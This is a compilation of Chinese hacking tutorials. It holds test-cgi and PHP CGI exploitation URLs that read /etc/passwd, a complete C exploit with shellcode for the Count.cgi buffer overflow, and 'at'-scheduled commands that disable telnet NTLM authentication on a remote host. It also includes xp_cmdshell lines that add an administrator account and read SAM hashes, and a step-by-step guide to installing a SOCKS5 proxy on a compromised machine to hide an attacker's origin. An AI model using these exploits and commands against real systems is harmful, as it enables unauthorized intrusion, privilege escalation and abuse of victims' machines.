但是只有PHP作为CGI脚本时才能实现，而在作为Apache模量是不能运行的。想检查能否运行，只要在浏览器中输入： </P><P>http://hostname/cgi-bin/php.cgi </P><P>如果你看到返回这样的字样就可以运行： </P><P>PHP/FI Version 2.0b10 
... </P><P>三、test-cgi的问题 
test-cgi同样是个常常出现的漏洞，在浏览器中输入： </P><P>http://thegnome.com/cgi-bin/test-cgi?\whatever </P><P>将会返回： </P><P>CGI/1.0 test script report: </P><P>argc is 0. argv is . </P><P>SERVER_SOFTWARE = NCSA/1.4B 
SERVER_NAME = thegnome.com 
GATEWAY_INTERFACE = CGI/1.1 
SERVER_PROTOCOL = HTTP/1.0 
SERVER_PORT = 80 
REQUEST_METHOD = GET 
HTTP_ACCEPT = text/plain, application/x-html, application/html, 
text/html, text/x-html 
PATH_INFO = 
PATH_TRANSLATED = 
SCRIPT_NAME = /cgi-bin/test-cgi 
QUERY_STRING = whatever 
REMOTE_HOST = fifth.column.gov 
REMOTE_ADDR = 200.200.200.200 
REMOTE_USER = 
AUTH_TYPE = 
CONTENT_TYPE = 
CONTENT_LENGTH = </P><P>再来一次，这样输入： </P><P>http://thegnome.com/cgi-bin/test-cgi?\help&0a/bin/cat%20/etc/passwd </P><P>看到PASSWD了？ </P><P>用netcat 80 端口 进行攻击： </P><P>machine% echo "GET /cgi-bin/test-cgi?/*" | nc removed.name.com 80 </P><P>返回： </P><P>CGI/1.0 test script report: </P><P>argc is 1. argv is /\*. </P><P>SERVER_SOFTWARE = NCSA/1.4.1 
SERVER_NAME = removed.name.com 
GATEWAY_INTERFACE = CGI/1.1 
SERVER_PROTOCOL = HTTP/0.9 
SERVER_PORT = 80 
REQUEST_METHOD = GET 
HTTP_ACCEPT = 
PATH_INFO = 
PATH_TRANSLATED = 
SCRIPT_NAME = /bin/cgi-bin/test-cgi 
QUERY_STRING = /a /bin /boot /bsd /cdrom /dev /etc /home /lib /mnt 
/root /sbin /stand /sys /tmp /usr /usr2 /var 
REMOTE_HOST = remote.machine.com 
REMOTE_ADDR = 255.255.255.255 
REMOTE_USER = 
AUTH_TYPE = 
CONTENT_TYPE = 
CONTENT_LENGTH = </P><P>显示出了根目录！这样试试： </P><P>machine% echo "GET /cgi-bin/test-cgi?*" | nc removed.name.com 80 </P><P>返回： </P><P>CGI/1.0 test script report: </P><P>argc is 1. argv is \*. </P><P>SERVER_SOFTWARE = NCSA/1.4.1 
SERVER_NAME = removed.name.com 
GATEWAY_INTERFACE = CGI/1.1 
SERVER_PROTOCOL = HTTP/0.9 
SERVER_PORT = 80 
REQUEST_METHOD = GET 
HTTP_ACCEPT = 
PATH_INFO = 
PATH_TRANSLATED = 
SCRIPT_NAME = /bin/cgi-bin/test-cgi 
QUERY_STRING = calendar cgi-archie cgi-calendar cgi-date cgi-finger 
cgi-fortune cgi-lib.pl imagemap imagemap.cgi imagemap.conf index.html 
mail-query mail-query-2 majordomo majordomo.cf marker.cgi 
menu message.cgi munger.cgi munger.note ncsa-default.tar post-query 
query smartlist.cf src subscribe.cf test-cgi uptime 
REMOTE_HOST = remote.machine.com 
REMOTE_ADDR = 255.255.255.255 
REMOTE_USER = 
AUTH_TYPE = 
CONTENT_TYPE = 
CONTENT_LENGTH = </P><P>显示了/CGI-BIN/目录下的东西。 
CGI漏洞的利用（二） 
CGI漏洞向来是容易被人们忽视的问题，同时也是普遍存在的，前不久攻破PCWEEK LINUX的黑客就是利用了CGI的一个漏洞。我就自己所知道的和从外国站点看来的一些CGI漏洞来写一些利用CGI的攻击方法，水平有限写得不对的地方请来信告诉我：bamboo@kali.com.cn </P><P>四、Count.cgi溢出漏洞 </P><P>Count.cgi（wwwcount）是国外网站经常用的CGI网页计数程序，国内很少有人用它，不过还是有一些网站的CGI-BIN目录下有它，简单说一下它的原理以及利用方法。 
出现问题主要是由于QUERY_STRING 环境变量被复制到一个活动缓冲区，造成溢出，允许远程用户以HTTP管理员的身份执行任意命令。 
有人写了个程序来利用这个漏洞，只对Count.cgi 24以下版本有效： 
/*### count.c ########################################################*/ 
#include <stdio.h> 
#include <stdlib.h> 
#include <getopt.h> 
#include <unistd.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <netdb.h> 
#include <errno.h> </P><P>/* Forwards */ 
unsigned long getsp(int); 
int usage(char *); 
void doit(char *,long, char *); </P><P>/* Constants */ 
char shell[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xeb\x3c\x5e\x31\xc0\x89\xf1\x8d\x5e\x18\x88\x46\x2c\x88\x46\x30" 
"\x88\x46\x39\x88\x46\x4b\x8d\x56\x20\x89\x16\x8d\x56\x2d\x89\x56" 
"\x04\x8d\x56\x31\x89\x56\x08\x8d\x56\x3a\x89\x56\x0c\x8d\x56\x10" 
"\x89\x46\x10\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xbf" 
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" 
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" 
"/usr/X11R6/bin/xterm0-ut0-display0"; 
char endpad[]= 
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" 
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"; </P><P></P><P>int main (int argc, char *argv[]){ 
char *shellcode = NULL; 
int cnt,ver,retcount, dispnum,dotquads[4],offset; 
unsigned long sp; 
char dispname[255]; 
char *host; </P><P>
offset = sp = cnt = ver = 0; 
fprintf(stderr,"\t%s - Gus\n",argv[0]); 
if (argc<3) usage(argv[0]); </P><P>while ((cnt = getopt(argc,argv,"h:d:v:o:")) != EOF) { 
switch(cnt){ 
case 'h': 
host = optarg; 
break; 
case 'd': 
{ 
retcount = sscanf(optarg, "%d.%d.%d.%d:%d", 
&dotquads[0], 
&dotquads[1], 
&dotquads[2], 
&dotquads[3], &dispnum); 
if (retcount != 5) usage(argv[0]); 
sprintf(dispname, "%03d.%03d.%03d.%03d:%01d", 
dotquads[0], dotquads[1], dotquads[2],dotquads[3], dispnum); 
shellcode=malloc(strlen((char *)optarg)+strlen(shell)+strlen(endpad)); 
sprintf(shellcode,"%s%s%s",shell,dispname,endpad); 
} 
break; 
case 'v': 
ver = atoi(optarg); 
break; 
case 'o': 
offset = atoi(optarg); 
break; 
default: 
usage(argv[0]); 
break; 
} 
} </P><P>sp = offset + getsp(ver); </P><P>
(void)doit(host,sp,shellcode); </P><P>exit(0); 
} </P><P>unsigned long getsp(int ver) { </P><P>/* Get the stack pointer we should be using. YMMV. If it does not work, 
try using -o X, where x is between -1500 and 1500 */ 
unsigned long sp=0; </P><P>if (ver == 15) sp = 0xbfffea50; 
if (ver == 20) sp = 0xbfffea50; 
if (ver == 22) sp = 0xbfffeab4; 
if (ver == 23) sp = 0xbfffee38; /* Dunno about this one */ 
if (sp == 0) { 
fprintf(stderr,"I don't have an sp for that version try using the -o option.\n"); 
fprintf(stderr,"Versions above 24 are patched for this bug.\n"); 
exit(1); 
} else { 
return sp; 
} </P><P>} </P><P>
int usage (char *name) { 
fprintf(stderr,"\tUsage:%s -h host -d <display> -v <version> [-o <offset>]\n",name); 
fprintf(stderr,"\te.g. %s -h www.foo.bar -d 127.0.0.1:0 -v 22\n",name); 
exit(1); 
} </P><P>int openhost (char *host, int port) { </P><P>int sock; 
struct hostent *he; 
struct sockaddr_in sa; </P><P>he = gethostbyname(host); 
if (he == NULL) { 
perror("Bad hostname\n"); 
exit(-1); 
} </P><P>memcpy(&sa.sin_addr, he->h_addr, he->h_length); </P><P>sa.sin_port=htons(port); 
sa.sin_family=AF_INET; 
sock=socket(AF_INET,SOCK_STREAM,0); 
if (sock < 0) { 
perror ("cannot open socket"); 
exit(-1); 
} 
bzero(&sa.sin_zero,sizeof (sa.sin_zero)); </P><P>if (connect(sock,(struct sockaddr *)&sa,sizeof sa)<0) { 
perror("cannot connect to host"); 
exit(-1); 
} </P><P>return(sock); 
} </P><P>
void doit (char *host,long sp, char *shellcode) { </P><P>int cnt,sock; 
char qs[7000]; 
int bufsize = 16; 
char buf[bufsize]; 
char chain[] = "user=a"; </P><P>bzero(buf); </P><P>
for(cnt=0;cnt<4104;cnt+=4) { 
qs[cnt+0] = sp & 0x000000ff; 
qs[cnt+1] = (sp & 0x0000ff00) >> 8; 
qs[cnt+2] = (sp & 0x00ff0000) >> 16; 
qs[cnt+3] = (sp & 0xff000000) >> 24; 
} 
strcpy(qs,chain); 
qs[strlen(chain)]=0x90; </P><P>qs[4104]= sp&0x000000ff; 
qs[4105]=(sp&0x0000ff00)>>8; 
qs[4106]=(sp&0x00ff0000)>>16; 
qs[4107]=(sp&0xff000000)>>24; 
qs[4108]= sp&0x000000ff; 
qs[4109]=(sp&0x0000ff00)>>8; 
qs[4110]=(sp&0x00ff0000)>>16; 
qs[4111]=(sp&0xff000000)>>24; 
qs[4112]= sp&0x000000ff; 
qs[4113]=(sp&0x0000ff00)>>8; 
qs[4114]=(sp&0x00ff0000)>>16; 
qs[4115]=(sp&0xff000000)>>24; 
qs[4116]= sp&0x000000ff; 
qs[4117]=(sp&0x0000ff00)>>8; 
qs[4118]=(sp&0x00ff0000)>>16; 
qs[4119]=(sp&0xff000000)>>24; 
qs[4120]= sp&0x000000ff; 
qs[4121]=(sp&0x0000ff00)>>8; 
qs[4122]=(sp&0x00ff0000)>>16; 
qs[4123]=(sp&0xff000000)>>24; 
qs[4124]= sp&0x000000ff; 
qs[4125]=(sp&0x0000ff00)>>8; 
qs[4126]=(sp&0x00ff0000)>>16; 
qs[4127]=(sp&0xff000000)>>24; 
qs[4128]= sp&0x000000ff; 
qs[4129]=(sp&0x0000ff00)>>8; 
qs[4130]=(sp&0x00ff0000)>>16; 
qs[4131]=(sp&0xff000000)>>24; 
strcpy((char*)&qs[4132],shellcode); </P><P>sock = openhost(host,80); 
write(sock,"GET /cgi-bin/Count.cgi?",23); 
write(sock,qs,strlen(qs)); 
write(sock," HTTP/1.0\n",10); 
write(sock,"User-Agent: ",12); 
write(sock,qs,strlen(qs)); 
write(sock,"\n\n",2); 
sleep(1); </P><P>/* printf("GET /cgi-bin/Count.cgi?%s HTTP/1.0\nUser-Agent: %s\n\n",qs,qs); */ </P><P>/* 
setenv("HTTP_USER_AGENT",qs,1); 
setenv("QUERY_STRING",qs,1); 
system("./Count.cgi"); 
*/ 
} </P><P>———————————————————————————————————— </P><P>用法是：count -h <攻击目标IP> -d <显示> -v <Count.cgi的版本> 
例如：count -h www.foo.bar -d 127.0.0.1:0 -v 22 </P><P>五、用Count.cgi看图片 </P><P>这个不算是很有用的漏洞，可是既然写到这儿了，也就顺便提一下吧。可以利用Count.cgi看WEB目录以外的图片，据作者说有一些商业网站的图片里有一些商业机密，所以这个漏洞也算是有点用处吧！哈哈！ </P><P>在浏览器中这样输入： 
</P><P>其中/path_to_gif/file.gif是你要看的图片的路径。 </P><P>注意，这一漏洞只能被用来看（或下载）GIF格式的图片，而不能用于其他类型的文件。
远程屏蔽telnet服务的ntlm认证
很多人获得上传文件的权限和管理员权限以后想启动远程的tlelnet服务，但是却碰到 
讨厌的NTLM认证，对于这种情况，我们很多时候就采用上传文件（比如NTLM.exe），然后at远程定时执行，如果手头上没有这样的工具怎么办呢？ 
可以这么做: 
大家可以看一下win2000和nt4自带tlntadmn这个命令，他是用来控制台修改telnet设置的，很可惜这是一个控制台的交互式工具，所以at命令没有办法直接调用。 
现在我们执行一下tlntadmn，然后按照以下的顺序操作 
停止服务(5)->更改设置(3)->NTLM(7)->确认更改(y)->修改NTLM当前值(0)->再次确认(y)->退出菜单(0)->启动服务(4)->退出程序(0) 
现在大家记住了吧，先后顺序是5(回车)3(回车)7(回车)y(回车)0(回车)y(回车)0(回车)4(回车)0(回车) 
线在我们这么做 
at \\ip time "echo 5 > c:\t.txt" 
at \\ip time "echo 3 >> c:\t.txt" 
at \\ip time "echo 7 >> c:\t.txt" 
at \\ip time "echo y >> c:\t.txt" 
at \\ip time "echo 0 >> c:\t.txt" 
at \\ip time "echo y >> c:\t.txt" 
at \\ip time "echo 0 >> c:\t.txt" 
at \\ip time "echo 4 >> c:\t.txt" 
at \\ip time "echo 0 >> c:\t.txt" 
at \\ip time "c:\winnt\system32\tlntadmn.exe < c:\t.txt" 
at \\ip time "del c:\t.txt /f" 
呵呵按照上面的顺序一步一步执行 
当然你本地做一个t.txt文件也可以，内容如下: 
5 
3 
7 
y 
0 
y 
0 
4 
0 
每个字符后面要加回车，然后copy t.txt \\ip\c$ 
然后再 
at \\ip time "c:\winnt\system32\tlntadmn.exe < c:\t.txt" 
at \\ip time "del c:\t.txt /f" 
很简单的dos重定向原理，t.txt就相当于手工输入一系列的操作，完成tlntadmn的交互 
呵呵 
当然，你们可以在本地试验好以后再发到远程主机去 
我但是劝大家练习入侵的时候尽量不要使用工具，这样对自己没有帮助的
保护数据库服务器加强数据库安全
数据库是电子商务、金融以及ERP系统的基础，通常都保存着重要的商业伙伴和客户信息。不管数据完整性以及关系到系统安全这些在数据库中非常重要，但是数据库通常没有象操作系统和网络这样在安全性上受到重视。数据完整性和合法存取会受到很多方面的安全威胁，包括密码策略、系统后门、数据库操作以及本身的安全方案。 
为什么数据库安全很重要？ 
1、保护敏感信息和数据资产 
大多数企业、组织以及政府部门的电子数据都保存在各种数据库中。他们用这些数据库保存一些个人资料，比如员工薪水、医疗记录、员工个人资料等等。数据库服务器还掌握着敏感的金融数据。包括交易记录、商业事务和帐号数据，战略上的或者专业的信息，比如专利和工程数据，甚至市场计划等等应该保护起来防止竞争者和其他非法者获取的资料。数据库服务器还保存着一些有关员工详细资料的东西比如银行帐号、信用卡号码，以及一些商业伙伴的资料。 
2、数据库同系统紧密相关并且更难正确地配置和保护 
数据库应用程序通常都同操作系统的最高管理员密切相关。比如Oracle,Sybase,MS SQL Server数据库系统都有下面这些特点：用户帐号和密码，认证系统，授权模块和数据对象的许可控制，内置命令（存储过程），特定的脚本和程序语言（通常派生自SQL），中间件，网络协议，补丁和服务包，数据库管理和开发工具。许多DBA都全日工作来管理这些复杂的系统。但是，安全漏洞和不当的配置通常会造成严重的后果，而且都难以发现。而且一些安全公司也忽略数据库安全，数据专家又不把安全作为主要职责。“网络安全适应性”哲学——把安全当作持续过程而不是一次性的检查，还没有被数据库管理员认可。 
3、网络和操作系统的安全被认为非常重要，但是却不这样对待数据库服务器 
安全专家认为这是的一种普遍现象，他们都认为只要把网络和操作系统的安全搞好了，那么所有的应用程序也就安全了。现在的数据库系统都有很多方面被误用或者漏洞影响到安全。而且这些关系数据库都是“端口”型的，这就表示任何人都能够用分析工具试图连接到数据库上，而绕过操作系统的安全机制。比如：Oracle7.3和Oracle8使用的端口是1521和1526。多数数据库系统也有公开的默认帐号和默认密码。这两个特性大大地危害着数据库的安全。 
4、少数数据库安全漏洞不光威胁数据库的安全，也威胁到操作系统和其他可信任的系统。 
这也是为什么数据库安全很重要的原因：有些数据库提供机制威胁着网络安全低层。比如，某公司的数据库里面保存着所有技术文档、手册和白皮书，不认为数据库的安全非常重要。即使运行在一个非常安全的操作系统上，入侵者可能通过数据库获得操作系统权限，只需要执行一些内置在数据库中的扩展存储过程。这些存储过程能提供一些执行操作系统命令的接口，而且能访问所有的系统资源，如果这个数据库服务器还同其他服务器建立着信任关系，那么，入侵者就能够对整个域机器的安全产生严重威胁。 
5、数据库是电子商务、ERP系统和其他重要的商业系统的基础。 
许多电子交易和电子商务的焦点都放在WEB服务、JAVA和其他技术上，那么对于以关系数据库为基础的客户系统和B2B系统，数据库就显得更加重要。安全将直接关系到系统可靠性、数据事务完整性，和保密性。系统如果出现问题，将不仅仅对交易产生影响，同时也影响着公司的形象。这些系统需要对所有合作伙伴和客户信息保密性负责，但是它们又同时是对入侵者开放的。另外，ERP和想SAP R/3这样的管理系统都是建立在一些基本数据库系统上的。安全问题将直接同维护时间、系统完整性和客户信任密切相关联。 
需要注意那些安全漏洞？ 
传统数据库安全主要集中在用户帐号、规则和操作许可（比如对表和存储过程的访问权）上。而实际上，一个完全的数据库安全分析包含的范围宽得多，包括所有可能范围内的漏洞评定。下面是一些类别： 
软件风险。软件本身漏洞，错过操作系统补丁，脆弱的服务和不安全的默认配置等。 
管理风险。提供的安全选项不正确操作，默认设置，不正确地给其他用户提供权限，以及没有得到许可的系统配置改变等。 
用户行为风险。密码不够长，不确当的数据访问和恶意操作（偷窃数据结构）等。 
这些风险类别也同样适用与网络服务、操作系统。当加强数据库安全的时候，所有的因素都应该考虑。 
数据库安全——弱点和例子 
下面列出一些常用数据库服务器安全漏洞和配置缺陷。 
安全特性缺陷。 
大多数关系数据库已经存在上10年了，都是成熟的产品。不幸的是，IT和安全专家对网络和操作系统要求的许多特性在多数关系数据库上还没有被使用。 
没有内置一些基本安全策略。 
MS SQL Server Sybase Oracle7 Oracle8 
帐号锁定 N N N Y 
管理员帐号重命名 N N N N 
帐号健壮性要求 N N N Y 
帐号失效 N N N N 
密码失效 N Y Y Y 
登陆时间限制 N N N N 
由于这些数据库都是“端口性”的，操作系统核心安全机制不提供给数据库的网络连接，比如MS SQL Server，可以使用WINDOWS NT的安全机制来弥补上面的缺陷，但是，多数运行MS SQL Server的环境并不一定都是100%的 Windows NT。执行又是另一个问题。如果在运行Oracle 8，管理员怎么知道这些安全特性正在被使用？ 
上面列举这些特性连起来，将更加严重。由于系统管理员帐号不能改变（SQL Server和Sybase是“sa”，Oracle是“system”和“sys”），如果没有设置密码，入侵者就能直接登陆并攻击数据库服务器，没有任何东西能够阻止他们获得更高权限的系统帐号。 
数据库帐号管理。 
多数数据库提供的基本安全特性，都没有机制来限制用户必须选择健壮的密码。这就需要更加谨慎的控制和管理。也有一些额外的功能来管理和保护整个密码表。比如，Oracle系统有超过10个特殊的默认用户帐号和密码，并且有特定的密码来管理一些数据库操作，比如数据库的启动，控制网络监听进程和远程数据库登陆特权。许多系统密码都能给入侵者完全访问数据库的机会，更甚的是，有些就储存在操作系统中的普通文本文件中。比如： 
Oracle 内部密码，储存在strXXX.cmd文件中，其中XXX是Oracle系统ID和SID，默认是“ORCL”。这个密码用于数据库启动进程，提供完全访问数据库资源。这个文件在Windows NT中需要设置权限。 
Oracle监听进程密码，保存在文件“listener.ora”（保存着所有的Oracle执行密码）中，用于启动和停止 Oracle的监听进程。这需要设置一个健壮的密码来代替默认的，并且必须对访问设置权限。入侵者可以通过这个弱点进行DOS攻击。 
Oracle内部密码——“orapw”文件权限控制，Oracle内部密码和帐号密码允许SYSDBA角色保存在“orapw”文本文件中，该文件的访问权限应该被限制。即使加密，也能被入侵者暴力破解。 
这些只是一些例子。密码保护不仅只针对Oracle，其他数据库系统一样需要。 
操作系统后门。 
多数数据库系统都有一些特性，来满足数据库管理员，这些也成为数据库主机操作系统的后门。 
对于Sybase 和SQl Server的帐号“sa”，入侵者可以执行“扩展存储过程”来获得系统权限。只要登陆作为“sa”，就可以使用扩展存储过程 xp_cmdshell ，这允许Sybase和SQL Server用户执行操作系统命令，就好象在运行操作系统的命令行模式。比如，下面可以添加一个系统帐号“refdom”,密码是"nopassword"，并且添加到administrators组中： 
xp_cmdshell 'net user refdom nopassword /add' 
go 
xp_cmdshell 'net localgroup /add administrators refdom' 
go 
这就是因为SQL Server用Windows NT的本地帐号“localsystem”来运行的命令。黑客还可以使用 xp_regread 来读取加密的SAM密码。然后再暴力破解。 
xp_regread 'HKEY_LOCAL_MACHINE','SECURITY\SAM\Domains\Account','F' 
注意，能读出加密的密码是NT的"administrator"帐号也不能做的。SQL Server能读出来同样是使用的“LocalSystem”帐号。 
Oracle有这样的特性，可以获得操作系统的文件访问权限。比如，UTL_FILE允许用户读和写文件,UTL_FILE_DIR可以用来设置用户使用UTL_FILE还写文件。 
审核。 
主要信息和时间能被关系数据库的认证系统很详细地记录下来，但是，这只能在正确地使用和配置下才能起到安全和报警作用。这些功能能提前报警入侵者正在威胁数据库服务器，并且能探测和修复破坏。 
木马的威胁。 
数据库管理员需要特别小心，一个著名的木马能够密码改变存储过程修改密码，而且能通知入侵者。比如，可以添加几行到sp_password中，记录新帐号到库表中，通过EMAIL发送这个密码，或者写到文件中以后使用。这个存储过程不断地获得密码，直到弄到"sa"的密码。 
总之，安全专家，DBA等等都需要注意数据库安全就象他们配置系统一样。

怎样把肉鸡做成ＳＯＣＫ５代理跳板（３３８９肉鸡）
相信大家一定找了许多3389肉鸡了，呵呵（别做坏事哦）。我们一定不满足就用它来扫QQ吧，你有没有想过自己做个Sock5代理呢？是啊，现在的Sock5代理太难找了，尤其是用来给QQ加Sock5代理，呵呵。这只是一个方面哦。 
那么如果你找到了个速度快的3389肉鸡？好，LET‘S GO,我们把它做成自己的Sock5代理，呵呵。 
恩，我喜欢用IPC$管道来做事情，呵呵，那么我们先来打开肉鸡的TELNET吧（方便嘛，要是你不能用IPC$，那等会在说） 


********************************************************************************** 
需要的软件：(先都下来吧) 
srv.exe: http://www.sxren.net/tech/srv.exe 
ntlm.exe: http://www.sxren.net/tech/ntlm.exe 
snakeSksockserver.exe http://www.sxren.net/tech/sss.exe 
SocksCap.exe http://www.sxren.net/tech/sockscap.exe 
********************************************************************************** 

一、启动肉鸡的TELNET。(win2000下使用) 
一般说来，肉鸡的TELNET是不打开的，尤其需要认证，很讨厌呀。那我们就来打开它的TELNET。 
例子：我们的目标肉鸡IP：10.10.10.10 
我们作好的管理员：TsInternetUser 密码：1234 
OK，我们打开cmd命令窗口建立IPC$管道： 
————————————————————————————————----- 
c:\net use \\10.10.10.10\ipc$ "1234" /user:TsInternetUser 
命令完成！ 
c:\_ 
—————————————————————————————----------- 
好了，通道建立好了，我们把srv.exe sss.exe ntlm.exe全部上传（假设你都下载到你的硬盘c:\下面了） 
—————————————————————————————————————— 
c:\copy srv.exe \\10.10.10.10\admin$ 
1 files copied! 
c:\copy ntlm.exe \\10.10.10.10\admin$ 
1 files copied! 
c:\copy sss.exe \\10.10.10.10\admin$ 
1 files copied! 
———————————————————————————————————— 
OK，都复制完毕！我们继续，先打开一个我们自己的telnet(srv.exe) 
————————————————————————————————————— 
　　　　　　先看看时间： 
c:\net time \\10.10.10.10 
显示： 
　　　　　　c:\\\10.10.10.10 的当前时间是 2001/11/18 下午 08:55 
命令完成，我们来启动srv.exe 
c:\at \\10.10.10.10 09:00 srv.exe 
显示： 
新加了一项作业，其作业 ID=1 
好了，我们等到09：01后。来连接肉鸡： 
c:\telnet 10.10.10.10 99 
我们不需要身份验证就可以上去了。显示为： 
c:\winnt\system32> 
好了，接着我们在这个TELNET窗口打开NTLM.exe 
c:\winnt\system32>ntlm（不会显示你的输入，仔细打命令哦） 
显示： 
Windows 2000 Telnet Dump, by Assassin, All Rights Reserved. 
Done! 
C:\WINNT\system32> 
C:\WINNT\system32> 
YEAH！！！，我们现在来启动WIN2000自己的TELNET。首先我们终止srv.exe的telnet服务： 
C:\WINNT\system32>net stop telnet（不会显示你的输入，仔细打命令哦） 
系统会说你没有启动telnet服务，呵呵，不理他，继续： 
C:\WINNT\system32>net start telnet（不会显示你的输入，仔细打命令哦） 
这次真的启动TELNET了！！，我们另开一个命令（DOS）窗口就可以telnet到肉鸡上了. 
——————————————————————————————————————— 

二、我们开始做自己的Sock5代理：） 
关于snake的snakeSksockserver.exe我就不介绍了，这是个很好的制作代理跳板的东东，最大可以255级连跳哦：） 
好了，我们先前已经把snakeSksockserver.exe 该名成sss.exe并且传到了肉鸡10.10.10.10的admin$下面了，我们现在也打开了它的TELNET，OK，我们来登陆 
———————————————————————————————————————— 
c:>telnet 10.10.10.10 
Microsoft (R) Windows 2000 (TM) Version 5.00 (Build 2195) 
Welcome to Microsoft Telnet Client 
Telnet Client Build 5.00.99203.1 

Escape Character is ‘CTRL+]‘ 
You are about to send your password inforation to a remote computer 
in Internet zone. This might not be safe. Do you want to send it anyway(y/n):y 
NTLM Authentication failed due to insufficient credentials. 
Please login with 
clear text username and password 
Microsoft (R) Windows (TM) Version 5.00 (Build 2195) 
Welcome to Microsoft Telnet Service 
Telnet Server Build 5.00.99201.1 

login: TsInternetUser 
password: **** 
*========================================================== 
Microsoft Telnet 
*========================================================== 
c:> 
————————————————————————————————————————— 
好了，我们来看看怎么做代理： 
_________________________________________________________________________________ 
c:>sss.exe -install <---------开始安装 
显示： 
c:>sksockserver installed! 
来看看配置： 
c:>sss -config show 
显示： 
SkServer Port = 1813 <----开放服务的端口 ,我们记着这个1813端口哦 
SkServer StartType: 3 - Manual <---服务启动方式 
SkServer Enable Client Set Num:0 <---客户端的项目个数 
SkServer Pass SkServer Number:0 <---经过SkServer的项目个数 
来启动服务： 
c:>net start skserver 
提示你正在启动，并且完成。 
来检查一下是不是启动了： 
c:>net start 《--------------看看启动的服务列表 
These Windows 2000 services are started: 
...... 
Print Spooler 
Server 
Snake SockProxy Service <---------------就是它哦，呵呵! 
System Event Notification 
TCP/IP NetBIOS Helper Service 
Telephony 
Telnet 
The command completed successfully. 
c:>_ 
————————————————————————————————————————— 
好了，到这里我们已经做好了一个socks5代理了，我们自己的哦.OK，下面我们用sockscap来使用我们做代理。 
三、用SocksCap来用代理。 
下载安装好SocksCap后，我们在桌面上打开SocksCap V2，如图1 
 
看到File选项了吗？，点开他选Settings...弹出卡片，如图2 
 
在 SOCKS Server里面我们填肉鸡的IP：10.10.10.10，PortT填默认的1813断口哦。 
下面的我们选socks version 5，呵呵，和 Attempt local then remot,这是域名解析的顺序，先本地，然后才远程。 
设置完了点“确定”我们就可以使用了，哈。本来sockscap2.2版本支持拖放，就是说你把Ie的图标直接拖到sockscap 
小窗口里就好了，可我没找到，就先用2.1的吧：） 
添加应用程序到sockscap里面，看到sockscap里面那个"new"按钮了吗？点开它，会弹出一个卡片， 
Profile name ：名字，自己随便写啦，比如我们要把IE加进去，就写IE 
Command Line: 命令行，点后面的Browse...找到你的IE的程序路径，一般在c:\Program Files\Internet Explorer\IEXPLORE.EXE 
Working:填好上面那个，这个就自动加上了. 
这样我们就把IE加到SocksCap里面了，我们继续添几个东西进去。如图： 
 
我们可以双击里面的程序来使用，也可以选住程序在点"Run"来运行. 
四、我 用不成ipc$管道怎么办？？ 
其实我打开肉鸡的telnet是可以用来做跳板的，比如我们telnet倒10.10.10.10上 在telnet倒其他目标及其上^^来隐藏你的来源哦 . 
不是2000的机器,就直接在肉鸡上用ie下载sss.exe，在肉鸡上打开命令窗口来安装sock5代理把，呵呵。 
代理就写到这，和和,本想不介绍snakeSksockserver的，可实在认为这是个好东西，就贴点介绍在下面给大家看： 
************************************************************************************************************ 
1.与普通的Sock代理程序相比它支持多跳板之间的连续跳， 
而它却可支持最多达255个跳板之间的连跳运动， 
2. 普通的Sock代理程序之间的数据传输是不加密的， 
而它支持的跳板之间传输的数据是经过动态加密的， 
也就是说每次传输过程中，数据加密的方式都不相同。 
就算你不幸在hacking的过程中被webmaster发现， 
普通的sock代理程序将会被webmaster用sniffer把你的信息一览无遗， 
而恰巧你用的是它的话，webmaster将会看到一堆乱码！ 
3.普通的sock代理程序在设置上比较烦琐，而它只用两步就行了， 
普通的sock代理程序要不然只支持Tcp或Udp的连接，很少有二者兼顾的， 
而它却全部支持（可以用它上QQ哟!） 
4.普通的sock代理程序都是大胖子，而SSS的体积只有－72K 
(实在佩服snake的编程能力，能将这样一个sock代理只写了这么小的体积， 
可见功底深厚,不愧是高手的作品!) 
还是画个功能示意图吧: 
加密数据 加密数据 普通数据 sss 
[]=======[]=======[]=======[]========[]=：：：=[]=======[] 
